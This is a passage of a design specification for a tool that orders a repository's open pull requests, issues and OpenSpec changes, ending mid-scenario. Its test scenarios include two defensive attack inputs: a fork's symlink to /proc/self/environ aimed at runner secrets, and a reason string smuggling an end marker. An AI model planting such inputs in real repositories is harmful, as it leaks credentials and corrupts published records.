## Purpose

The sequencer recommends the order in which a repository's open work is
specified, implemented, reviewed and merged. Its script computes the order
with no model, from the repository's open pull requests and issues and,
where they exist, its open OpenSpec changes. One rule, that a change whose
code calls another change's code is built after it, needs a model, and
runs only where one is available. The script publishes the order in one
issue's body and a block in each ordered item's body, and names each
reviewer's next review. It orders a cycle by a fixed rule, which a
person can override. It recommends and never merges.

These terms hold throughout this spec:

- **The script** is the skill's script. **A caller** is whatever runs it:
  an agent in a session, the skill's CI workflow, or an Igor, one of the AI
  teammates of adamstallard/igor, whose Sequencer role adamstallard/igor#231
  describes.
- **An item** is an open issue or open pull request that the order holds.
  An item's **number** is its issue or pull request number, and its
  **repository** is the `owner/repo` name of the repository that holds it.
- One item is **opened earlier** than another when GitHub's creation time
  for it is earlier. Where the times are equal, the earlier is the one
  whose repository's name sorts first, then the one with the lower number.
- **A time** in the order's text is a UTC minute, written as
  `2026-11-24 10:00 UTC`.
- Two members of one cycle share a place; of them, **the later in the
  order** is the later in the cycle's order, by rule or by override.
- **The order's issue** is the one issue whose body holds the whole order:
  one line per item, giving what it waits on, edges and merge waits
  alike, with their reasons, and a list of
  edges not counted.
- **A change** is an OpenSpec change: a directory under `openspec/changes/`
  other than `archive/`. **An open change** is one on its repository's default branch, or one
  in an open pull request's diff against its base, if the pull request's
  head still holds it. A change **belongs to** the
  earliest-opened open pull request whose diff against its base adds or
  changes a file in the change's directory that its head still holds,
  looking first only at pull requests writers opened, and at all of them
  when no writer's pull request does, and
  the order places the
  change where it places that pull request.
- **A change's requirement** is a requirement that the change's delta adds,
  or renames onto a new name, and that no spec on its repository's default
  branch holds.
- **An explicit link** is a GitHub "blocked by" relation, a `Depends on`
  line in a body, or a `Builds on:` line in a change's `proposal.md`, as *Explicit links order the items they connect*
  and *A Depends on line names items by number, with or without their
  repository* define.
- **A pull request is tied to an issue** when GitHub's closing
  references say it closes the issue, or a line in its body names the issue
  as `Part of #<number>` or after one of GitHub's closing keywords
  (`close`, `closes`, `closed`, `fix`, `fixes`, `fixed`, `resolve`,
  `resolves`, `resolved`, in any case). Such a line follows every rule of a
  `Depends on` line, with its own words in place of `Depends on `, and a
  keyword repeated before a later reference, as in `Closes #10, closes
  #123`, adds that reference to the line's list.
- **An outside item** is an issue or pull request that an explicit link
  or a tie names, in a repository whose items the order does not hold.
- **An edge** is a rule's finding that one item comes after another, with
  its **reason**; a finding that an item comes after itself is no edge. **A cycle** is a set of items whose edges lead from each
  back to itself. **A merge wait**, set by *Pull requests that change the
  same files merge one after another*, is not an edge.
- **A writer** is an account with write access to the repository that
  holds the item or comment in question. A GitHub App's bot account counts
  as a writer only for the issues and pull requests it opens and the
  reviews it submits, never for its comments, when that App is installed on
  the repository.
- **A statement of a read not made** is one of the sentences that *A token
  that cannot read permissions counts writers by association*, *A token
  that cannot see installations counts no App* and *Relations the token
  cannot read are named* write in the order's issue.
- **A change's hash** is a hash of every file under the change's
  directory, read from the default branch or pull request head the change
  is read from.
- **An edges file** is the model step's output: the pairs of changes it
  checked, each with the two changes' hashes from the `order` run it read,
  and the code edges it found. Its pairs and edges name each change by
  repository and name, as a line of the record's legend does.
- **The model step** applies the one rule that needs a model: a change
  whose code will call another change's code is built after it. **A pair
  of changes** is two changes, each belonging to a different open pull
  request a writer opened, so a change on the default branch, or one
  belonging to a pull request no writer opened, is in no pair; and **a code edge** is an edge the model step found.
- **`order`** is the script's command that prints the order, and
  **`publish`** the one that edits bodies.
- **A change's key** is two lowercase letters or digits that stand for
  the change in the order's issue's record of checked pairs, kept while
  the change stays in that record's legend. A new key is `00` in an empty legend, and otherwise the one after the
  highest in it, counting `0`-`9` then `a`-`z` in each place, or,
  past `zz`, the lowest free key. In the record's `unchecked:` list a row
  `X,Y` gives the higher key first, and the rows of `code edges:` and
  `unchecked:` each sort by their first key, then their second, ascending.
- **A Sequencer Igor** is an Igor in the Sequencer role.

## ADDED Requirements

### Requirement: The order holds every open pull request and the issues linked to the work

The order SHALL hold each open pull request and, of the open issues, only
those that an explicit link connects to another open issue or pull request through an edge that
counts (see *Only edges set by writers count*), and those that an open
pull request a writer opened is tied to; the order's issue is never an
item. Only writers' links and ties bring issues in, since otherwise anyone
could make the script write blocks into writers' issues.

#### Scenario: An issue linked to nothing is not ordered

- **WHEN** an open issue has no explicit link to or from another issue or
  pull request, and no open pull request is tied to it
- **THEN** the order does not hold it, and its body gets no block

#### Scenario: A blocked issue is ordered

- **WHEN** open issue #12, opened by a writer, has the line `Depends on #9`
- **THEN** the order holds both #12 and #9

#### Scenario: The order's issue is never ordered

- **WHEN** the order's issue is #40, and #12's body has the line
  `Depends on #40`
- **THEN** the order does not hold #40, and #40's body gets no item block

### Requirement: An issue takes the place of an open pull request tied to it

Where open pull requests that writers opened are tied to an issue, the
issue SHALL share the place of the earliest opened of them, and its
block SHALL name that pull request. Each of them SHALL come after what the
issue comes after, and what comes after the issue SHALL come after each of
them, but edges between the issue and them SHALL be dropped.

#### Scenario: A pull request and the issue it closes share a place

- **WHEN** open pull request #50 closes issue #43, and #50 is third in the
  order
- **THEN** #43 is third too, and its block says it is closed by #50

#### Scenario: A pull request doing part of an issue's work takes its place

- **WHEN** #108's body holds the line `Part of #107 and #112`, no other
  open pull request is tied to either, and #108 is third in the order
- **THEN** #107 and #112 are third too, and each one's block says #108 does
  part of it

#### Scenario: A stacked pull request's Closes line ties it

- **WHEN** #64's base is the branch `spec/inquisitor`, so GitHub gives it
  no closing reference, and its body holds the line `Closes #43`
- **THEN** #64 is tied to #43, and #43 shares #64's place

#### Scenario: Naming an issue in prose ties no pull request to it

- **WHEN** #108's body says `Implements the docs part of #107` and holds no
  `Part of` line, and nothing else links #107
- **THEN** the order does not hold #107

#### Scenario: An issue two pull requests close follows the one opened earlier

- **WHEN** #50 and #57 both close issue #43, and #50 was opened earlier
- **THEN** #43 shares #50's place, and its block names #50

#### Scenario: An issue's own link moves onto every pull request tied to it

- **WHEN** #43's body says `Depends on #61`, #50 closes #43, and #51 says
  `Part of #43`
- **THEN** #50 and #51 both come after #61, and #43 shares the place of
  whichever of them was opened earlier

#### Scenario: An issue that depends on its own parts sets no cycle

- **WHEN** #107's body says `Depends on #108, #109`, and #108 and #109
  each say `Part of #107`
- **THEN** #107's edges after #108 and #109 are dropped, so neither of
  them comes after the other, and #107 shares the place of whichever was
  opened earlier

#### Scenario: An item after an issue comes after every pull request tied to it

- **WHEN** #108 and #109 say `Part of #107`, #110 closes #107, and #70's
  body says `Depends on #107`
- **THEN** #70 comes after #108, #109 and #110

#### Scenario: An outside author's closing reference moves nothing

- **WHEN** `zed`, without write access, opens #48 saying `Fixes #43`, and
  #50, opened later by a writer, also closes #43
- **THEN** #43 shares #50's place, not #48's, and gains no place from #48
  alone, and #48's line lists its tie to #43 as not counted, opened by
  `zed`, and #48's line does not say `tied to no issue`

#### Scenario: An installed App's pull request counts as a writer's

- **WHEN** a GitHub App that the script's token can tell is installed on
  the repository opens #90 as its bot account, #90's body holds the line `Part of #43`, and no other pull
  request is tied to #43
- **THEN** #43 shares #90's place

### Requirement: A pull request tied to no issue is listed

Each open pull request with no tie to any issue SHALL say so on its line
in the order's issue. A tie that moves nothing, such as one to another
repository's issue, still counts as a tie. A tie from a pull request no
writer opened SHALL be listed as not counted, with its author, as an
edge set by an item no writer opened is, and it still keeps the pull
request from saying `tied to no issue`.

#### Scenario: A pull request tied to no issue is listed

- **WHEN** draft pull request #64 closes no issue and names none in a
  `Part of` or `Closes` line, though issue #43 is the work it does
- **THEN** #64 is listed although it is a draft: its line in the order's
  issue says `tied to no issue`

#### Scenario: A tie to another repository's issue moves nothing

- **WHEN** #64's body holds the line `Part of octo/lib#7`, and nothing else
  ties #64 to an issue
- **THEN** `octo/lib#7` gets no place, and #64's line in the order's issue
  does not say `tied to no issue`

### Requirement: A closing line naming several issues says which GitHub will not close

Where a line starting with a closing keyword, in the body of a pull
request into the default branch, names an issue that GitHub's closing
references for the pull request do not hold, the pull request's block
SHALL name that issue; pull requests into other branches are left out,
since GitHub records closing references only for pull requests into the
default branch.

#### Scenario: A second issue after one keyword is named

- **WHEN** #108, into the default branch, says `Closes #10, #123`, and
  GitHub's closing references for #108 hold only #10
- **THEN** #108 is tied to #10 and #123, and its block says
  `` GitHub will not close #123: write `Closes` before it ``

#### Scenario: A stacked pull request gets no closing note

- **WHEN** #64, into #25's branch, says `Closes #10, #123`
- **THEN** #64 is tied to #10 and #123, and its block has no `GitHub will
  not close` line

### Requirement: Each change is read from the head of the pull request it belongs to

Where several open pull requests' heads hold one change's directory, the
script SHALL read the change, and compute its hash, from the head of the
pull request it belongs to, as the terms above define, and ignore the
other copies.

#### Scenario: A stacked pull request's older copy is ignored

- **WHEN** #25 adds the change `inquisitor`, so the change belongs to #25,
  and #64, stacked on #25, also changes a file in
  `openspec/changes/inquisitor/`
- **THEN** the script reads and hashes `inquisitor` from #25's head, and
  #64's copy sets no edge and no hash

#### Scenario: A change archived on its pull request's head is not open

- **WHEN** #82's head, the only place holding the change `claims`, moves
  it under `openspec/changes/archive/`, and #90's change modifies a
  requirement `claims` adds
- **THEN** `claims` is not an open change, and #90 gains no edge from it

### Requirement: A change already on the default branch is not placed

A change on its repository's default branch that belongs to no open pull
request SHALL
not be placed, since it merged before every item, and an edge to it SHALL
be dropped.

#### Scenario: An edge to a merged change is dropped

- **WHEN** the change `claims` is on the default branch with no open pull
  request, and #90's change modifies a requirement `claims` adds
- **THEN** `claims` has no place in the order, and #90 gains no edge from
  it

### Requirement: The script reads OpenSpec changes only through the OpenSpec CLI

The script SHALL read each open change's requirements and deltas only
through OpenSpec's CLI, from each pull request's head as fetched files,
never a checkout. It SHALL use the CLI only at 1.16.1 or later, because an
earlier CLI can drop requirements without saying so. With an older or missing CLI, the script
SHALL apply no rule that reads a change's requirements or deltas, and,
where some open change exists, the order's issue SHALL say requirements'
dependencies were not checked, and why.

#### Scenario: A missing CLI checks no requirement

- **WHEN** `openspec` is not on the path, and two open pull requests hold
  changes
- **THEN** no edge comes from a change's requirements, and the order's
  issue says requirements' dependencies were not checked, because OpenSpec is not
  installed

#### Scenario: A change is read without checking out its head

- **WHEN** the script reads #90's change from #90's head
- **THEN** it reads fetched files, and the working tree and `HEAD` are as
  they were

#### Scenario: An old CLI checks no requirement

- **WHEN** the script runs where `openspec --version` prints `1.14.3`, and
  two open pull requests hold changes
- **THEN** no edge comes from a change's requirements, and the order's
  issue says
  `Dependencies between requirements were not checked: OpenSpec 1.16.1 or
  later is not installed (this one is 1.14.3).`

### Requirement: The CLI reads the default branch's OpenSpec settings

The script SHALL run the CLI with `openspec/config.yaml` and
`openspec/schemas/` from the default branch, never a pull request's,
because those choose how the CLI reads files and a fork's pull request
could change them.

#### Scenario: A fork's settings are not used

- **WHEN** a fork's pull request #95 changes `openspec/config.yaml`
- **THEN** the script reads every change, #95's included, with the
  default branch's `openspec/config.yaml`

### Requirement: A change holding anything but files and directories is not checked

Where a change's directory on a pull request's head holds a symlink, or any
entry other than a regular file or a directory, the script SHALL read none
of that change's files and write none to disk, the change SHALL be in no
pair and have no hash, and the order's issue SHALL list it as not checked,
saying why, since a symlink can point at a secret on the runner. Its pull
request SHALL still be placed by explicit links and the time it was opened,
and still given merge waits.

#### Scenario: A fork's symlink is never followed

- **WHEN** a fork's pull request #95 holds its change's `proposal.md` as a
  symlink to `/proc/self/environ`
- **THEN** the order's issue lists #95's change as not checked, because it
  holds a symlink, and the script reads none of its files

### Requirement: A change the OpenSpec CLI refuses is listed as not checked

Where the OpenSpec CLI runs on a change but refuses it, the script SHALL
apply no rule that reads that change's requirements or deltas, and the
order's issue SHALL list the change as not checked, with the CLI's reason.

#### Scenario: A change the CLI refuses is not counted as checked

- **WHEN** `openspec show --json` refuses #93's change, and #82 and #90
  hold changes it reads
- **THEN** the order's issue lists #93's change as not checked, quoting the
  CLI's reason

### Requirement: A change that modifies another change's requirement comes after it

A change whose delta modifies, removes or renames another open change's
requirement SHALL come after that change.

#### Scenario: A modifying change waits for the one that adds the requirement

- **WHEN** #82's change adds *An open condition never ends a running
  service*, and #90's change modifies it
- **THEN** #90 comes after #82, with the reason
  `` after #82: modifies its `An open condition never ends a running service` ``

#### Scenario: Removing or renaming another change's requirement orders it too

- **WHEN** #91's change removes a requirement #82's change adds, and #93's
  renames another of #82's
- **THEN** both #91 and #93 come after #82

### Requirement: A change that names another change's requirement comes after it

A change in whose files, other than its own deltas' requirement headers,
the full title of another open change's requirement appears verbatim SHALL
come after that change.

#### Scenario: A citing change waits for the cited one

- **WHEN** #91's `tasks.md` names *An open condition never ends a running
  service*, which #82's change adds
- **THEN** #91 comes after #82, with the reason
  `` after #82: cites its `An open condition never ends a running service` ``

#### Scenario: A requirement already in force orders nothing

- **WHEN** #91 names a requirement that the default branch's specs hold
- **THEN** that citation gives no edge

### Requirement: Explicit links order the items they connect

An item SHALL come after each item that a GitHub "blocked by" relation or a
`Depends on` line in its body says it waits on, and a change's pull request
after the pull request each `Builds on:` line in its `proposal.md` names;
a `Builds on:` line naming an issue gives no edge and is listed as not
counted.

#### Scenario: A Depends on line orders two issues

- **WHEN** #12's body holds the line `Depends on #9, #10 and #11`
- **THEN** #12 comes after #9, #10 and #11, with the reasons `after #9:
  depends on it`, `after #10: depends on it` and `after #11: depends on it`

#### Scenario: A Builds on line orders a stacked change

- **WHEN** #64's change's `proposal.md` says
  `Builds on: inquisitor (adamstallard/shared-skills#25)`, in the
  repository adamstallard/shared-skills
- **THEN** #64 comes after #25, with the reason `after #25: builds on it`

#### Scenario: A Builds on line naming an issue is listed

- **WHEN** #64's change's `proposal.md` says
  `Builds on: claims (adamstallard/shared-skills#43)`, and #43 is an issue
- **THEN** #64 gains no edge from it, and #64's line says
  `not counted: builds on #43, an issue`

#### Scenario: A blocked-by relation orders two items

- **WHEN** GitHub records #14 as blocked by #11
- **THEN** #14 comes after #11, with the reason `after #11: blocked by it`

#### Scenario: A link to a closed item orders nothing

- **WHEN** #12's body holds the line `Depends on #9`, and #9 is closed
- **THEN** #12 gains no edge from it, and the order does not hold #9

### Requirement: A Depends on line names items by number, with or without their repository

A `Depends on` line SHALL be a body line, outside code fences, starting
`Depends on ` (case-sensitive), then `#<number>` or `<owner>/<repo>#<number>`
references separated by commas or `and`, `<owner>` holding letters,
digits and `-`, `<repo>` adding `.` and `_`. The references SHALL end
at the first other text, which is ignored. A reference naming in
full the line's own repository, in either letter case, SHALL read as
`#<number>`. A
`Builds on:` line's parentheses SHALL follow the same rules.

#### Scenario: A reference naming this repository in full orders like a short one

- **WHEN** #12's body, in the repository adamstallard/shared-skills, holds
  the line `Depends on adamstallard/shared-skills#9`
- **THEN** #12 comes after #9, with the reason `after #9: depends on it`

#### Scenario: Text after the references is ignored

- **WHEN** #12's body holds the line `Depends on #9 (the schema)`
- **THEN** #12 comes after #9, with the reason `after #9: depends on it`

#### Scenario: A reference with a mention in it is no reference

- **WHEN** #12's body holds the line `Depends on @org/team#1`
- **THEN** it gives no edge, is not listed as not counted, and the
  order's issue writes no `@org/team`

#### Scenario: A Depends on line in a code fence is ignored

- **WHEN** the only `Depends on #9` in #12's body is inside a code fence
- **THEN** it gives no edge

### Requirement: A link to an outside item is listed as not counted

An explicit link or a tie naming an outside item SHALL move nothing and
bring no issue into the order. The order's issue SHALL list such an explicit
link as not counted, on the line of the item that has it or, where the order does
not hold that item, in its list of edges not counted, writing the outside
item as plain `<owner>/<repo>#<number>` text, which GitHub turns into a
link. The script SHALL make no request to an outside item's repository.

#### Scenario: A Depends on line naming another repository is listed and orders nothing

- **WHEN** pull request #12's body holds the line
  `Depends on #9 and octo/lib#7`
- **THEN** #12 comes after #9, and #12's line in the order's issue says
  `not counted: depends on octo/lib#7, in another repository`, where
  GitHub shows `octo/lib#7` as a link, as it does on every such line
- **AND** the script makes no request about `octo/lib#7`, and lists the
  link whether `octo/lib#7` is open or closed

#### Scenario: A blocked-by relation to another repository's issue is listed

- **WHEN** GitHub records the issue #14 as blocked by the issue
  `octo/lib#7`
- **THEN** #14's line says
  `not counted: blocked by octo/lib#7, in another repository`

#### Scenario: A Builds on line naming another repository is listed

- **WHEN** #64's change's `proposal.md` says
  `Builds on: claims (octo/lib#31)`, in the repository
  adamstallard/shared-skills
- **THEN** #64's line says
  `not counted: builds on octo/lib#31, in another repository`

#### Scenario: An issue whose only link names another repository is not ordered

- **WHEN** open issue #12's only explicit link is the body line
  `Depends on octo/lib#7`, and no open pull request is tied to #12
- **THEN** the order does not hold #12, and the order's issue lists
  `#12: depends on octo/lib#7, in another repository` as not counted

### Requirement: A token that cannot read permissions counts writers by association

Where the script's token cannot read another account's permission, it SHALL
count as a writer the author of an issue, pull request or comment whose
`author_association` is OWNER, MEMBER or COLLABORATOR, the closest
signal GitHub gives without that read, though it counts some members
without write access, and the order's issue SHALL say `Permissions were not read: writers are counted by author
association.`

#### Scenario: A token that cannot read permissions counts collaborators

- **WHEN** the script's token cannot read another account's permission,
  and `li`, whose `author_association` on #82 is COLLABORATOR, opened #82
- **THEN** #82 counts as opened by a writer, and the order's issue says
  `Permissions were not read: writers are counted by author association.`

### Requirement: A token that cannot see installations counts no App

Where the script's token cannot tell whether an App is installed, no
App's bot account SHALL count as a writer, and the order's issue SHALL say
`Installed Apps were not read: no App counts as a writer.`

#### Scenario: A token that cannot see installations counts no App

- **WHEN** the script's token cannot tell whether an App is installed, and
  an App's bot account opened #130
- **THEN** #130 counts as opened by no writer, and the order's issue says
  `Installed Apps were not read: no App counts as a writer.`

### Requirement: Other callers follow the fallbacks the workflow wrote

Where the default branch holds
`.github/workflows/sequencer.yml`, a session's run, or an Igor's run of
`order`, since an Igor publishes only through the workflow, SHALL apply the fallback of each statement of a read not made that
the order's issue holds, and any fallback its own token needs, so that, while the workflow's
token has the limits it noted, a session's publish and the workflow run it
triggers give the same order.

#### Scenario: A session counts writers as the workflow did

- **WHEN** the default branch holds `.github/workflows/sequencer.yml`, the
  order's issue says `Permissions were not read: writers are counted by
  author association.`, and a session whose token can read permissions
  publishes
- **THEN** the session counts writers by author association, and the
  workflow run its edit triggers changes nothing

#### Scenario: A session with no statements uses its own token

- **WHEN** no workflow run has published, the order's issue holds no
  statement of a read not made, and a session whose token cannot read
  permissions publishes
- **THEN** it counts writers by author association, the order's issue says
  `Permissions were not read: writers are counted by author association.`,
  and the next workflow run replaces that with its own token's results

### Requirement: The workflow, and callers without it, read with their own token

A workflow run, and any caller where the default branch holds no
`.github/workflows/sequencer.yml`, SHALL use only its own token's reads,
whatever statements of reads not made the order's issue holds.

#### Scenario: The workflow reads with its own token

- **WHEN** the order's issue says `Permissions were not read: writers are
  counted by author association.`, and a workflow run whose token can
  read permissions publishes
- **THEN** it counts writers by permission, and the order's issue no
  longer says permissions were not read

### Requirement: Relations the token cannot read are named

Where the script's token cannot read "blocked by" relations, the script
SHALL order by the other links alone, and the order's issue SHALL say
`"Blocked by" relations were not read.` Where it can read them but not
those naming another repository's issue, the order's issue SHALL say
`"Blocked by" relations to other repositories were not read.`

#### Scenario: A token that cannot read relations orders by lines

- **WHEN** the script's token cannot read "blocked by" relations, GitHub
  records #14 as blocked by #11, and #12's body says `Depends on #9`
- **THEN** #12 comes after #9, #14 gains no edge from #11, and the order's
  issue says `"Blocked by" relations were not read.`

#### Scenario: A token that cannot read other repositories' relations says so

- **WHEN** the script's token reads #14's relation to #11 but not #15's
  relation to `octo/lib#7`
- **THEN** #14 comes after #11, #15 gains no edge from `octo/lib#7`, and
  the order's issue says `"Blocked by" relations to other repositories
  were not read.`

### Requirement: Only edges set by writers count

An edge SHALL count only when a writer opened every item whose text sets
it. For an edge from changes' files or the model step, those items are both
changes' pull requests; for a `Depends on` line, the item holding it;
for a `Builds on:` line, the pull request its change belongs to; for a blocked-by relation, the blocked item, whoever added the relation. The order's
issue SHALL list the edges that do not count, each with the account that
opened the item setting it.

#### Scenario: A Depends on line from an outside author is not counted

- **WHEN** issue #120, opened by `zed` who has no write access, says
  `Depends on #9`, and nothing else links #120 or #9
- **THEN** #120 gains no edge after #9, the order holds neither issue, so
  neither body gets a block, and the order's issue lists `#120 after #9`
  as not counted, opened by `zed`

#### Scenario: An installed App's issue sets an edge

- **WHEN** a GitHub App that the script's token can tell is installed on
  the repository opens issue #130 as its bot account, and #130's body holds the line `Depends on #9`
- **THEN** #130 comes after #9, and the order holds both

#### Scenario: A citation set by an outside author's title is not counted

- **WHEN** `zed`, without write access, opens #121, whose change adds a
  requirement titled as a sentence in #82's `tasks.md`
- **THEN** #82 does not come after #121, and the order's issue lists that
  edge as not counted, opened by `zed`

### Requirement: Pull requests that change the same files merge one after another

Where two open pull requests change a file in common, the later of them in
the order SHALL get a merge wait on the earlier, with a reason naming the
files in common, when a writer opened the earlier. A merge wait SHALL move neither pull request in the order
and count in no reviewer's ranking, so each later pull request rebases
once, onto the one merged before it.

#### Scenario: Overlapping pull requests get a merge wait

- **WHEN** #30 and #33 both change `src/claims.py`, #30 was opened
  earlier, and no edge connects them
- **THEN** #33 stays after #30, where the order they were opened in placed it, and #33's
  block says `` merges after #30: both change `src/claims.py`; rebase once
  onto it ``

#### Scenario: An outside author's pull request sets no merge wait

- **WHEN** `zed`, without write access, opens #31 changing `README.md`,
  and #33, opened later by a writer, also changes it
- **THEN** #33's block names no merge wait on #31

#### Scenario: A merge wait counts in no reviewer's ranking

- **WHEN** #28 and #30 both await a reviewer, one item comes after #28 through
  an edge, none comes after #30 through an edge, and #33 and #35 have merge
  waits on #30
- **THEN** the order's issue names #28 as that reviewer's next review

### Requirement: Items no rule orders keep the order they were opened in

Among the items that come after no unplaced item through an edge, the one
opened earliest SHALL go next, and a cycle SHALL count as one item opened when its
earliest-opened member was.

#### Scenario: Two unrelated items are placed by when they were opened

- **WHEN** no edge connects #20 and #17, and GitHub's creation time for
  #20 is the earlier
- **THEN** #20 comes before #17, and neither block gives a reason for that
  place

#### Scenario: Two items opened at the same time are placed by number

- **WHEN** no edge connects #20 and #17, and GitHub gives both the same
  creation time
- **THEN** #17 comes before #20

#### Scenario: A cycle is placed by its earliest-opened member

- **WHEN** #40 and #44 form a cycle, #42 is connected to neither, and the
  three were opened in number order
- **THEN** the cycle comes before #42, placed as if opened when #40 was

### Requirement: A cycle's members are ordered by rule

The order SHALL place a cycle's members together at one place, earliest
opened first, marked `ordered by rule since <time>` with the time at which
the cycle was first published, or just `ordered by rule` before any
publish has listed it, and place each item that comes after any member
after all of them. A cycle whose members change is a new cycle. A member
placed before another member, though an edge puts it after that one,
SHALL say so in its reason.

#### Scenario: Two changes that cite each other are ordered by when they were opened

- **WHEN** #82's change cites a requirement #85's adds, and #85's cites one
  #82's adds, #82 was opened earlier, and no override is recorded
- **THEN** the order places #82 then #85 at one place, marked
  `ordered by rule since <time>`, and #82's reason says
  `` before #85 by rule, though it cites #85's `<title>` ``
- **AND** #91, which cites #85, comes after both

#### Scenario: A cycle that gains a member gets a new time

- **WHEN** the publish at 2026-11-24 09:00 UTC first listed the cycle of
  #82 and #85, and the publish at 10:00 UTC that day is the first to find
  #88 in it
- **THEN** the 10:00 publish marks the cycle of #82, #85 and #88
  `ordered by rule since 2026-11-24 10:00 UTC`

#### Scenario: A cycle not yet published has no time

- **WHEN** `order` runs before any publish has listed the cycle of #82 and
  #85
- **THEN** it prints the cycle as `ordered by rule`, with no time

### Requirement: A cycle override is kept and followed

The order's issue SHALL keep a list of cycle overrides, each naming the
member a writer put first and linking their comment. The order SHALL put
that member first and the rest earliest opened first, and its reason
SHALL give the same link. The cycle's mark SHALL become `ordered by
override since <time>`, keeping its time, so that later comments are
still judged against that time.

#### Scenario: An override puts a later-opened member first

- **WHEN** a writer put #85 first, in a cycle where #82
  and #85 cite each other's requirements and #82 was opened earlier
- **THEN** #85 comes first, with the reason
  `` before #82, though it cites #82's `<title>`: chosen at <link to the comment> ``,
  and #82 comes after it

### Requirement: A cycle override is read from the order's issue

A run SHALL read a comment on the order's issue as an override when a
writer posted it in a later UTC minute than
the cycle's `since` time, and its text starts with `#<n> first`,
`#<n>` being one of the cycle's members. Of several such comments, the
latest is the override.

#### Scenario: A writer's comment overrides the rule

- **WHEN** a writer comments `#85 first` on the order's
  issue after the cycle of #82 and #85 was listed
- **THEN** the next run adds the override, linking that comment, and
  places #85 first

#### Scenario: The latest comment wins, judged against the first time

- **WHEN** the cycle of #82 and #85 was first listed at 2026-11-24 09:00
  UTC, and after that a writer comments `#85 first`, and later another
  writer comments `#82 first`
- **THEN** #82 comes first, and the cycle is marked
  `ordered by override since 2026-11-24 09:00 UTC`

#### Scenario: A comment from someone without write access overrides nothing

- **WHEN** a person without write access comments `#85 first` after the
  cycle of #82 and #85 was listed
- **THEN** the cycle stays ordered by rule

#### Scenario: A comment on an item's thread overrides nothing

- **WHEN** a writer comments `#85 first` on #82's thread,
  not on the order's issue
- **THEN** no run reads it, and the cycle stays ordered by rule

#### Scenario: A comment older than the cycle overrides nothing

- **WHEN** a writer commented `#85 first` on the order's
  issue before the cycle of #85 and #90 was listed
- **THEN** that comment leaves the cycle ordered by rule

#### Scenario: A comment an App posts overrides nothing

- **WHEN** a GitHub App with write access posts `#85 first` on the order's
  issue
- **THEN** the cycle stays ordered by rule

### Requirement: The model step orders changes whose code calls each other's code

A change whose code will call code another open change adds SHALL come after
that change, as the model step finds. To help it, the script SHALL print,
for each pair of changes, the
backticked names that both changes'
`tasks.md` files hold. The script SHALL take the model step's edges only
with a reason each, and refuse the whole set when any edge has no reason.

#### Scenario: The script points the model step at shared names

- **WHEN** #82's `tasks.md` adds a function `claim_item()`, and #90's
  `tasks.md` calls `claim_item()`
- **THEN** the script prints `claim_item()` as a name both #82 and #90's
  tasks hold

#### Scenario: A model-step edge with no reason is refused

- **WHEN** the model step's edges include `octo/app claim-retries` after
  `octo/app add-claims-table` with an empty reason
- **THEN** the script publishes none of that set's edges, and says which
  edge it refused

### Requirement: The order's issue records which pairs were checked

The order's issue SHALL record the model step's results in three lists:
`legend:`, one line per change in a pair, giving its key, its repository
as `<owner>/<repo>`, its name and its full hash; `code edges:`, one row `X>Y <reason>` per code
edge, X coming after Y, so an edge each way is two rows; and
`unchecked:`, rows `X *` for a change unchecked against every other and
`X,Y` for one unchecked pair. A pair of listed changes that no row
names SHALL count as checked with no edge.

#### Scenario: The record lists only edges and unchecked pairs

- **WHEN** the model step checked every pair of `add-claims-table`,
  `sequencer-ranks` and `claim-audit-log` except `claim-audit-log` with
  `sequencer-ranks`, finding only that `sequencer-ranks` calls
  `claim_item()` from `add-claims-table`, `claim-retries` has opened since, and
  keys `a3` and `a4` left with their merged changes
- **THEN** the record reads, in the repository `octo/app`, with each
  change's full hash in place of `<hash>`:
  ```
  legend:
  a1 octo/app add-claims-table <hash>
  a2 octo/app sequencer-ranks <hash>
  a5 octo/app claim-audit-log <hash>
  a6 octo/app claim-retries <hash>
  code edges:
  a2>a1 calls claim_item()
  unchecked:
  a5,a2
  a6 *
  ```

### Requirement: The record of checked pairs is inert text

The record SHALL sit in a code fence longer than any run of backticks in
it, and each name and reason in it SHALL have its line breaks written as
spaces. Every row starts with a key, so no row forms a marker line.

#### Scenario: A reason holding a marker stays in its row

- **WHEN** the model step's reason for `a2>a1` holds a line break and then
  `<!-- sequencer:end -->`
- **THEN** the record writes that reason on the row `a2>a1`, the line break
  as a space, and the order's block ends only at the script's own end
  marker

### Requirement: A checked pair is kept while both its changes are unchanged

Each run SHALL give a new change a new key and `X *`, give a revised
change its new hash and `X *` in place of every row naming it, and remove a change
that left every pair, with its rows. `publish` SHALL then take each pair
of an edges file whose two hashes match the legend, and remove it from
`unchecked:`: an `X *` row the taken pairs cover in part becomes an `X,Y`
row for each pair still unchecked. A taken pair's code edges SHALL become
the file's, none if it gives none.

#### Scenario: A run with no model keeps an unchanged code edge

- **WHEN** a session's model step recorded #90 after #82 for calling its
  code, and a CI run with no credential recomputes the order after #77
  merges, with #82 and #90's change files unchanged
- **THEN** the edge stays, and the order counts code dependencies between
  #82 and #90 as checked

#### Scenario: A code edge goes when a change is revised

- **WHEN** a push revises #90's `tasks.md`
- **THEN** the next run drops the code edge between #82 and #90, and counts
  that pair as unchecked

#### Scenario: A pair checked with no edge stays checked

- **WHEN** the model step checked #82 and #95 and found no edge, and a
  later run finds both changes' files unchanged
- **THEN** that run counts the pair as checked, and does not label the
  order's issue `sequencer: check code` for it

#### Scenario: A partly checked new change keeps its unchecked pairs

- **WHEN** the record lists `a1`, `a2`, `a5` and `a6` with the row `a6 *`,
  and an edges file checks `a6` with `a1` and with `a2`, finding no edge
- **THEN** `a6 *` becomes the row `a6,a5`

#### Scenario: A merged change leaves the record

- **WHEN** the record lists `a2` with the rows `a2>a1 calls claim_item()`
  and `a5,a2`, and `a2`'s pull request merges
- **THEN** the next run removes `a2` from the legend and both rows

#### Scenario: An unrelated change keeps a file's edges

- **WHEN** the model step checked #82 and #90 and found #90 after #82, and
  before `publish` runs, issue #120 gains a comment, #95's change is
  revised and #77 merges
- **THEN** `publish` takes the edge between #82 and #90, and drops each
  pair the file gives that holds #95's or #77's change

### Requirement: A full order's issue holds a note in place of the order

Where the order's issue's body would pass 65,536 characters, the script SHALL replace the order under `# Order`, record
included, with the note `The order's issue is full: <n> open items need
more than GitHub's 65,536 characters. No order is published until some
merge or close.`, keeping each cycle's members and its `since <time>`
mark, whose time later overrides are judged by. It SHALL edit no other body, call no
model, and remove the label `sequencer: check
code`, since no model step runs.

#### Scenario: Too many open items fill the order's issue

- **WHEN** 320 open items would make the order's issue hold 70,000
  characters, and #82 and #90 form a cycle ordered by override
- **THEN** the order's issue, under `# Order`, holds `The order's issue is
  full: 320 open items need more than GitHub's 65,536 characters. No order
  is published until some merge or close.` and the cycle's members and
